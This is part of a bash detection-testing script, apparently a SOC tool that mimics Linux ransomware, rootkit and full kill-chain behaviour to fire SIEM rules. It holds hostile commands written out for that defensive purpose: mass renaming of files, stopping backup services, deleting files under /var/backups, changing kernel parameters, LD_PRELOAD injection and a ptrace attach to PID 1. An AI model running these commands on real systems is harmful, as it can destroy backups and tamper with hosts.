  siem "RULE-L54" "Mass file read operation — ransomware pre-encryption survey" "T1486"
  add_result "Ransomware" "RULE-L54" "MASS_FILE_READ" "triggered" "find_exec_cat"

  info "Mass file rename to .soc_encrypted_${RND} extension (RULE-L57)..."
  while IFS= read -r f; do
    cmd_run "mv '${f}' '${f}.soc_encrypted_${RND}'"
    sleep 0.05
  done < <(find "${SOC_DIR}/userdata" -type f 2>/dev/null)
  trig "Mass rename → auditd SYSCALL renameat burst (90 events)"
  siem "RULE-L57" "Mass file rename to .soc_encrypted — ransomware pattern" "T1486"
  add_result "Ransomware" "RULE-L57" "MASS_FILE_RENAME" "triggered" "mv_encrypted_ext"

  info "Ransom note creation across directories (RULE-L56)..."
  for d in documents photos finance; do
    cmd_run "cat > '${SOC_DIR}/userdata/${d}/README_RESTORE.txt' <<'EOF'
YOUR FILES HAVE BEEN ENCRYPTED BY SOC_TEST_${RND}
Contact: soc_test@soctest.local for recovery instructions.
THIS IS A SOC DRILL — NO REAL ENCRYPTION OCCURRED.
EOF"
  done
  trig "Ransom notes written to 3 directories → auditd OPEN+WRITE"
  siem "RULE-L56" "Ransom note files created across multiple directories" "T1486"
  add_result "Ransomware" "RULE-L56" "RANSOM_NOTE_CREATED" "triggered" "cat_readme_restore"

  info "Backup deletion simulation (RULE-L55)..."
  cmd_run "systemctl stop rsync   2>/dev/null || true"
  cmd_run "systemctl stop bacula  2>/dev/null || true"
  cmd_run "touch '${SOC_FILE}_marker'"
  cmd_run "find /var/backups/ -name '*.bak' -newer '${SOC_FILE}_marker' -delete 2>/dev/null || true"
  cmd_run "ls /var/lib/timeshift/snapshots/ 2>/dev/null || true"
  trig "Backup service stop + backup file deletion → auditd EXECVE systemctl/find"
  siem "RULE-L55" "Backup deletion/stop commands — ransomware kill chain" "T1490"
  add_result "Ransomware" "RULE-L55" "BACKUP_DELETION" "triggered" "systemctl_stop_rsync"

  cmd_run "rm -rf '${SOC_DIR}/userdata'"
  ok "Category Ransomware complete"
}


# =============================================================================
# CATEGORY 13 — Kernel / Rootkit Indicators
# =============================================================================
cat_kernel() {
  section "Kernel / Rootkit Indicators (RULE-L59 → L62)"

  mkdir -p "$SOC_DIR"
  awatch "/proc/sys/kernel" "wa" "proc_sys_watch_${RND}"
  asyscall "ptrace"               "ptrace_probe_${RND}"

  # ── 1. Kernel module enumeration (RULE-L59) ────────────────────────────────
  info "Kernel module enumeration (RULE-L59)..."
  cmd_run "lsmod > '${SOC_FILE}_lsmod' 2>/dev/null || true"
  cmd_run "cat /proc/modules | head -10 2>/dev/null || true"
  local first_mod
  first_mod=$(lsmod 2>/dev/null | awk 'NR==2{print $1}' || echo "")
  [[ -n "$first_mod" ]] && cmd_run "modinfo '${first_mod}' 2>/dev/null | head -5 || true"
  trig "lsmod + /proc/modules + modinfo → auditd EXECVE"
  siem "RULE-L59" "Kernel module enumeration — possible rootkit preparation" "T1547.006"
  add_result "Kernel" "RULE-L59" "KMOD_ENUM" "triggered" "lsmod_modinfo"

  # ── 2. /proc/sys modification (RULE-L60) ──────────────────────────────────
  info "/proc/sys kernel parameter modification (RULE-L60)..."
  local orig_forward
  orig_forward=$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo "0")
  cmd_run "sysctl -w kernel.core_uses_pid=1 2>/dev/null || true"
  cmd_run "sysctl -w net.ipv4.ip_forward=1  2>/dev/null || true"
  trig "sysctl -w → auditd SYSCALL open+write on /proc/sys"
  siem "RULE-L60" "/proc/sys modified — kernel parameter tamper (ip_forward=1)" "T1562"
  add_result "Kernel" "RULE-L60" "PROC_SYS_MODIFIED" "triggered" "sysctl_w"
  cmd_run "sysctl -w kernel.core_uses_pid=0     2>/dev/null || true"
  cmd_run "sysctl -w net.ipv4.ip_forward=${orig_forward} 2>/dev/null || true"

  # ── 3. LD_PRELOAD abuse (RULE-L62) ────────────────────────────────────────
  info "LD_PRELOAD custom shared library (RULE-L62)..."
  if command -v gcc &>/dev/null; then
    cat > "/tmp/soc_preload_${RND}.c" <<'EOF'
#include <stdio.h>
void __attribute__((constructor)) soc_init() { /* SOC test constructor */ }
EOF
    cmd_run "gcc -shared -fPIC -o '/tmp/soc_preload_${RND}.so' '/tmp/soc_preload_${RND}.c' 2>/dev/null || true"
    cmd_run "LD_PRELOAD='/tmp/soc_preload_${RND}.so' /bin/ls /tmp 2>/dev/null | head -3 || true"
    trig "LD_PRELOAD=/tmp/soc_preload.so /bin/ls → auditd EXECVE with LD_PRELOAD in env"
    siem "RULE-L62" "LD_PRELOAD set to custom shared library — rootkit pattern" "T1574.006"
    add_result "Kernel" "RULE-L62" "LD_PRELOAD_ABUSE" "triggered" "gcc_shared_ld_preload"
    cmd_run "rm -f '/tmp/soc_preload_${RND}.c' '/tmp/soc_preload_${RND}.so'"
  else
    skip "gcc not installed — skipping LD_PRELOAD compilation (optional dependency)"
    add_result "Kernel" "RULE-L62" "LD_PRELOAD_ABUSE" "skipped" "gcc_missing"
  fi

  # ── 4. ptrace probe (RULE-L61) ────────────────────────────────────────────
  # FIX: strace writes trace output to stderr, NOT stdout.
  #      Old code: strace -p 1 2>/dev/null | head -3
  #        → stderr suppressed, head waits forever on empty pipe = HANG
  #      New code: timeout 3 strace -p 1 2>&1 | head -3
  #        → stderr→stdout so head gets either the attach error or trace lines
  #        → timeout ensures termination if strace successfully attaches to PID 1
  info "ptrace probe attempt (RULE-L61)..."
  if command -v strace &>/dev/null; then
    # timeout 3: prevents infinite hang if strace attaches successfully
    # 2>&1: redirects strace stderr (where output goes) into the pipe for head
    timeout 3 strace -e trace=ptrace,process -p 1 2>&1 | head -5 || true
    trig "strace -p 1 → auditd SYSCALL ptrace (EPERM = expected, event still logged)"
    siem "RULE-L61" "ptrace called on init (PID 1) — possible injection probe" "T1055"
    add_result "Kernel" "RULE-L61" "PTRACE_PROBE" "triggered" "strace_p1"
  else
    # Fallback: python ctypes ptrace syscall (nr 101 on x86_64)
    python3 -c '
import ctypes, ctypes.util
libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
PTRACE_ATTACH = 16
# Call ptrace(PTRACE_ATTACH, 1, 0, 0) — will fail with EPERM but still logged
libc.ptrace(PTRACE_ATTACH, 1, 0, 0)
' 2>/dev/null || true
    partial "strace not installed — used ctypes ptrace(PTRACE_ATTACH,1) fallback"
    add_result "Kernel" "RULE-L61" "PTRACE_PROBE" "partial" "ctypes_ptrace_attach"
  fi

  ok "Category Kernel complete"
}


# =============================================================================
# CATEGORY 14 — Kill Chain (Full ATT&CK Sequence)
# =============================================================================
cat_killchain() {
  echo ""
  echo -e "${BOLD}${RED}"
  echo "  ╔════════════════════════════════════════════════════════════╗"
  echo "  ║          FULL ATT&CK KILL CHAIN SIMULATION                ║"
  echo "  ╚════════════════════════════════════════════════════════════╝"
  echo -e "${NC}"

  kchain "Stage 1: Initial Access & Execution"
  cat_discovery
  cat_execution
  kchain "Stage 1: Initial Access & Execution — COMPLETE"
  sleep 2

  kchain "Stage 2: Persistence & Privilege Escalation"
  cat_persistence
  cat_privesc
  kchain "Stage 2: Persistence & Privilege Escalation — COMPLETE"
  sleep 2

  kchain "Stage 3: Defense Evasion & Credential Access"
  cat_defenseevasion
  cat_credaccess
  kchain "Stage 3: Defense Evasion & Credential Access — COMPLETE"
  sleep 2

  kchain "Stage 4: Lateral Movement & C2"
  cat_lateralmovement
  cat_c2
  kchain "Stage 4: Lateral Movement & C2 — COMPLETE"
  sleep 2

  kchain "Stage 5: Impact — Ransomware"
  cat_ransomware
  kchain "Stage 5: Ransomware Impact — COMPLETE"
  sleep 2

  echo ""
  echo -e "${BOLD}${RED}══════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}${RED}  KILL CHAIN COMPLETE — FULL ATT&CK TIMELINE:${NC}"
  echo -e "${BOLD}${RED}══════════════════════════════════════════════════════${NC}"
  echo -e "  Stage 1 → Discovery + Execution (LOLBins)"
  echo -e "  Stage 2 → Persistence + PrivEsc"
  echo -e "  Stage 3 → Defense Evasion + Credential Access"
  echo -e "  Stage 4 → Lateral Movement + C2"
  echo -e "  Stage 5 → Ransomware Impact"
}


# =============================================================================
# MITRE ATT&CK COVERAGE MATRIX
# =============================================================================
show_mitre_coverage() {
  echo ""
  echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}${CYAN}  MITRE ATT&CK COVERAGE MATRIX — SOC-LinuxEventTrigger-v2${NC}"
  echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════════${NC}"
  printf "%-22s %-16s %-32s %-18s %s\n" "Tactic" "Technique" "Scenario" "Category" "Rule"
  echo "──────────────────────────────────────────────────────────────────────────────────"
  printf "%-22s %-16s %-32s %-18s %s\n" "Initial Access"     "T1078"      "Account Abuse / Valid Accounts"      "Authentication"  "RULE-L01,L02"
  printf "%-22s %-16s %-32s %-18s %s\n" "Initial Access"     "T1110.001"  "SSH Brute Force"                     "Authentication"  "RULE-L01"
  printf "%-22s %-16s %-32s %-18s %s\n" "Execution"          "T1059"      "LOLBin Chain"                        "Execution"       "RULE-L14"
  printf "%-22s %-16s %-32s %-18s %s\n" "Execution"          "T1059.004"  "Bash Shell / Reverse Shell"          "Execution,C2"    "RULE-L15,L50"
  printf "%-22s %-16s %-32s %-18s %s\n" "Execution"          "T1059.006"  "Python Script Interpreter"           "Execution"       "RULE-L15"
  printf "%-22s %-16s %-32s %-18s %s\n" "Execution"          "T1027"      "Base64 Encoded Command"              "Execution"       "RULE-L17"
  printf "%-22s %-16s %-32s %-18s %s\n" "Persistence"        "T1053.003"  "Cron Job Persistence"                "Persistence"     "RULE-L19"
  printf "%-22s %-16s %-32s %-18s %s\n" "Persistence"        "T1053.001"  "At Job Persistence"                  "Persistence"     "RULE-L25"
  printf "%-22s %-16s %-32s %-18s %s\n" "Persistence"        "T1543.002"  "Systemd Service Install"             "Persistence"     "RULE-L20"
  printf "%-22s %-16s %-32s %-18s %s\n" "Persistence"        "T1546.004"  ".bashrc/.profile Modification"       "Persistence"     "RULE-L21"
  printf "%-22s %-16s %-32s %-18s %s\n" "Persistence"        "T1098.004"  "SSH Authorized Keys"                 "Persistence"     "RULE-L22"
  printf "%-22s %-16s %-32s %-18s %s\n" "Privilege Escalation" "T1548.001" "SUID Bit / Enumeration"            "PrivEsc"         "RULE-L09,L13"
  printf "%-22s %-16s %-32s %-18s %s\n" "Privilege Escalation" "T1548.002" "Capability Abuse (cap_setuid)"     "PrivEsc"         "RULE-L12"
  printf "%-22s %-16s %-32s %-18s %s\n" "Privilege Escalation" "T1548.003" "Sudoers Modification"              "PrivEsc"         "RULE-L11"
  printf "%-22s %-16s %-32s %-18s %s\n" "Privilege Escalation" "T1069"     "sudo -l Enumeration"               "PrivEsc"         "RULE-L10"
  printf "%-22s %-16s %-32s %-18s %s\n" "Defense Evasion"    "T1562.012"  "auditd Disabled"                     "DefenseEvasion"  "RULE-L26"
  printf "%-22s %-16s %-32s %-18s %s\n" "Defense Evasion"    "T1070.002"  "Log File Cleared"                    "DefenseEvasion"  "RULE-L27"
  printf "%-22s %-16s %-32s %-18s %s\n" "Defense Evasion"    "T1070.003"  "Bash History Cleared"                "DefenseEvasion"  "RULE-L28"
  printf "%-22s %-16s %-32s %-18s %s\n" "Defense Evasion"    "T1070.006"  "Timestomping"                        "DefenseEvasion"  "RULE-L29"
  printf "%-22s %-16s %-32s %-18s %s\n" "Defense Evasion"    "T1222"      "File Immutable (chattr)"             "DefenseEvasion"  "RULE-L30"
  printf "%-22s %-16s %-32s %-18s %s\n" "Defense Evasion"    "T1547.006"  "Kernel Module Enumeration"           "DefenseEvasion"  "RULE-L31"
  printf "%-22s %-16s %-32s %-18s %s\n" "Defense Evasion"    "T1574.006"  "LD_PRELOAD Hijack"                   "Kernel"          "RULE-L62"
  printf "%-22s %-16s %-32s %-18s %s\n" "Credential Access"  "T1003.008"  "/etc/shadow Dump"                    "CredAccess"      "RULE-L32"
  printf "%-22s %-16s %-32s %-18s %s\n" "Credential Access"  "T1552.004"  "SSH Private Key Harvest"             "CredAccess"      "RULE-L33"
  printf "%-22s %-16s %-32s %-18s %s\n" "Credential Access"  "T1552"      "Credential File Search"              "CredAccess"      "RULE-L34"
  printf "%-22s %-16s %-32s %-18s %s\n" "Credential Access"  "T1003"      "/proc Memory Cred Dump"              "CredAccess"      "RULE-L35"
  printf "%-22s %-16s %-32s %-18s %s\n" "Discovery"          "T1046"      "Network Discovery Burst"             "Discovery"       "RULE-L37"
  printf "%-22s %-16s %-32s %-18s %s\n" "Discovery"          "T1082"      "System Info Discovery"               "Discovery"       "RULE-L37"
  printf "%-22s %-16s %-32s %-18s %s\n" "Discovery"          "T1087"      "User/Group Enumeration"              "Discovery"       "RULE-L38"
  printf "%-22s %-16s %-32s %-18s %s\n" "Discovery"          "T1518.001"  "Security Tool Enumeration"           "Discovery"       "RULE-L39"
  printf "%-22s %-16s %-32s %-18s %s\n" "Discovery"          "T1552.005"  "Cloud Metadata Access"               "Discovery"       "RULE-L40"
  printf "%-22s %-16s %-32s %-18s %s\n" "Lateral Movement"   "T1021.004"  "SSH Lateral Move + SCP"              "LateralMovement" "RULE-L41,L42"
  printf "%-22s %-16s %-32s %-18s %s\n" "Lateral Movement"   "T1071"      "Unusual Process Net Connection"      "LateralMovement" "RULE-L43"
  printf "%-22s %-16s %-32s %-18s %s\n" "Collection"         "T1560"      "Archive for Exfil (tar+zip)"         "Exfil"           "RULE-L45"
  printf "%-22s %-16s %-32s %-18s %s\n" "Exfiltration"       "T1048"      "curl/wget Data Exfil"                "Exfil"           "RULE-L48"
  printf "%-22s %-16s %-32s %-18s %s\n" "Exfiltration"       "T1048.003"  "DNS Tunnelling Pattern"              "Exfil"           "RULE-L47"
  printf "%-22s %-16s %-32s %-18s %s\n" "Command & Control"  "T1059.004"  "Reverse Shell (bash/py/socat)"       "C2"              "RULE-L50"
  printf "%-22s %-16s %-32s %-18s %s\n" "Command & Control"  "T1071.001"  "HTTP Beacon with Jitter"             "C2"              "RULE-L51"
  printf "%-22s %-16s %-32s %-18s %s\n" "Command & Control"  "T1571"      "Netcat Bind Shell Unusual Port"      "C2"              "RULE-L52"
  printf "%-22s %-16s %-32s %-18s %s\n" "Impact"             "T1486"      "Mass File Encrypt/Rename"            "Ransomware"      "RULE-L54,L57"
  printf "%-22s %-16s %-32s %-18s %s\n" "Impact"             "T1490"      "Backup Deletion"                     "Ransomware"      "RULE-L55"
  printf "%-22s %-16s %-32s %-18s %s\n" "Impact"             "T1562"      "/proc/sys Kernel Tamper"             "Kernel"          "RULE-L60"
  printf "%-22s %-16s %-32s %-18s %s\n" "Defense Evasion"    "T1055"      "ptrace / Process Injection Probe"    "Kernel"          "RULE-L61"
  printf "%-22s %-16s %-32s %-18s %s\n" "Account Mgmt"       "T1136"      "User Created+Deleted <15min"         "AccountMgmt"     "RULE-L05"
  printf "%-22s %-16s %-32s %-18s %s\n" "Account Mgmt"       "T1078"      "User Added to sudo Group"            "AccountMgmt"     "RULE-L06"
  printf "%-22s %-16s %-32s %-18s %s\n" "Account Mgmt"       "T1098"      "Password Changed (privileged)"       "AccountMgmt"     "RULE-L08"
  echo "──────────────────────────────────────────────────────────────────────────────────"
  echo -e "${BOLD}  Total Techniques:  ~46 MITRE ATT&CK techniques${NC}"
  echo -e "${BOLD}  Total SIEM Rules:  62 (RULE-L01 → RULE-L62)${NC}"
  echo -e "${BOLD}  Log Sources:       auditd, auth.log, syslog, journald, cron, wtmp${NC}"
  echo ""
}


# =============================================================================
# FINAL SUMMARY
# =============================================================================
show_summary() {
  echo ""
  echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}${BLUE}  EXECUTION SUMMARY${NC}"
  echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
  echo -e "  ${GREEN}Triggered:${NC} ${TRIGGERED}"
  echo -e "  ${YELLOW}Partial:${NC}   ${PARTIAL}"
  echo -e "  ${YELLOW}Skipped:${NC}   ${SKIPPED}"
  echo -e "  ${RED}Errors:${NC}    ${ERRORS}"
  echo -e "  ${CYAN}Intensity:${NC} ${INTENSITY} (burst=${BURST}, delay=${DELAY}s)"
  echo -e "  ${CYAN}RND Tag:${NC}   ${RND}"
  if [[ "$DO_REPORT" == true ]]; then
    echo -e "  ${CYAN}JSON Report:${NC} ${RESULTS_JSON}"
    echo -e "  ${CYAN}CSV Report:${NC}  ${RESULTS_CSV}"
  fi
  echo ""
}


# =============================================================================
# MAIN DISPATCHER
# =============================================================================
main() {
  preflight

  if [[ "$DO_MITRE" == true ]]; then
    show_mitre_coverage
    exit 0
  fi

  case "$CATEGORY" in
    Authentication)  cat_authentication  ;;
    AccountMgmt)     cat_accountmgmt     ;;
    PrivEsc)         cat_privesc         ;;
    Execution)       cat_execution       ;;
    Persistence)     cat_persistence     ;;
    DefenseEvasion)  cat_defenseevasion  ;;
    CredAccess)      cat_credaccess      ;;
    Discovery)       cat_discovery       ;;
    LateralMovement) cat_lateralmovement ;;
    Exfil)           cat_exfil           ;;
    C2)              cat_c2              ;;
    Ransomware)      cat_ransomware      ;;
    Kernel)          cat_kernel          ;;
    KillChain)       cat_killchain       ;;
    All)
      cat_authentication || true
      cat_accountmgmt || true
      cat_privesc || true
      cat_execution || true
      cat_persistence || true
      cat_defenseevasion || true
      cat_credaccess || true
      cat_discovery || true
      cat_lateralmovement || true
      cat_exfil || true
      cat_c2 || true
      cat_ransomware || true
      cat_kernel || true
      ;;
    *)
      echo -e "${RED}Unknown category: ${CATEGORY}${NC}"
      echo "Valid categories: Authentication AccountMgmt PrivEsc Execution Persistence"
      echo "                  DefenseEvasion CredAccess Discovery LateralMovement Exfil"
      echo "                  C2 Ransomware Kernel KillChain All"
      exit 1
      ;;
  esac

  show_summary
}

main "$@"
